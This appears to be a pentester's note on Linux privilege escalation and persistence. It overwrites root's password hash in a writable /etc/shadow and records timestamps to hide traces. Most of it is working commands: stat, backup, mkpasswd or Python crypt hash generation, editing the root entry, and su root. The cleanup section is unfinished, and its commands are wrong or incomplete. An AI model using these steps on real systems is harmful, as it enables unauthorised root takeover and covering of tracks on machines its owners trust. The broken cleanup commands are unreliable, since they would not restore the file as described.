# Living off the Land

> [!INFO]
> Nowadays most modern Linux servers and desktops currently are most up-to-date and I can say you'll never find it. Yet you can use this method as a persistence technique yet it's not **OPSEC** safe. However, you'll might need it under certain circumstances.

## 01 - Enumerate

```
$ ls -l /etc/shadow
```

## 02 - Exploit

Before resetting the password. Take note of the timestamp to clear traces ahead of time.

```
$ stat /etc/shadow
```

Backup the shadow file. To clear traces ahead of time.

```
$ cp /etc/shadow /tmp/shadow.bak && sudo chmod o+r /etc/shadow
```

### 2.1 - Overwrite Password via Hash Digest

#### 2.1.1 - `mkpasswd`

Consult the command's usage for available hash digest algorithms.

```
$ mkpasswd -m help
```

Generate the password hash by supplying an input.

```
$ mkpasswd -m sha512crypt newpass1234
```

#### 2.1.2 - Python `crypt` Module

```
$ python -c 'import crypt; print(crypt.crypt("newpass1234", "$6$salt"))'
```

Then edit the shadow file `root:<sha512crypt_hash>:17298:0:99999:7:::` replace the old `<sha512crypt_hash>` which starts with `$6$` into a new one that was previously generated. Then try to authenticate and you're root.

```
$ su root
```

## 03 - Cleanup

TODO: Fill in this info

```
$ cp /etc/shadow.bak /tmp/shadow

$ touch
```

---
## References

### Juggernaut-Sec

- [Juggernaut-Sec: Weak File Permissions - Linux Privilege Escalation](https://juggernaut-sec.com/weak-file-permissions/)